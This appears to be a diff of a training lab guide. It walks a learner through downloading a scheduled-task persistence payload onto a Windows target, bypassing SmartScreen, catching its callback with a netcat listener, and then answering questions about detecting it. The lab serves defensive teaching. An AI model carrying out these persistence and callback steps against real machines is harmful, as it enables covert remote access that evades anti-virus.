@@ -19,7 +19,7 @@
 
 6. Open a firefox browser window and browse to http:172.32.14.10:8000
 
-7. Click the client folder, and then again click **icschtasks.go** to download it to the device.
+7. Click **icschtasks.exe** to download it to the device.
 
 8. If there are warnings from smart screen, acknoledge them and choose "keep anyway"
 Note: this is not the same service as windows defender, it is an artifact of us using the browser to move it over, not the payload being caught by anti-virus.
@@ -30,15 +30,15 @@ The payload will generate persistence with a scheduled task and call back out to
 
 1. On the Attacker Desktop, open a new terminal window.
 2. Run a net cat listnener on port 666.
-`nc -lvnp 666`
+`sudo nc -lvnp 666`
 3. Switch back to the Windows Target.
 4. Use the desktop icon for CMD. Right click, and choose 'Run As Administrator'
 
 5. Change directory to the downloads folder. (This one is a little tricky.)
 `cd C:\Users\pslearner.PS-WIN-1\Downloads`
 
-6. Run the payload.
-`icschtasks.exe`
+6. Run the payload. With arguments.
+`icschtasks.exe 1 1`
 Note: Unless something has changed significantly for the worse for my workshop, you should have ZERO notifications from anti-virus.
 
 7. Swap back to your Attack Desktop, inpsect the terminal where you ran the server executable. You will see connections from the persistence after about a minute or so..  It will attempt again every minute or so, you will need to restart the netcat listener to catch it a gain. No interaction is required.
@@ -58,4 +58,4 @@ What are names of files, where are they, and what do they do.
 
 What is the name of the scheduled task, and how could you detect it as malicous in an enterprise environment.
 
-
+- [IOCs](./schtasks_IOCs.md)
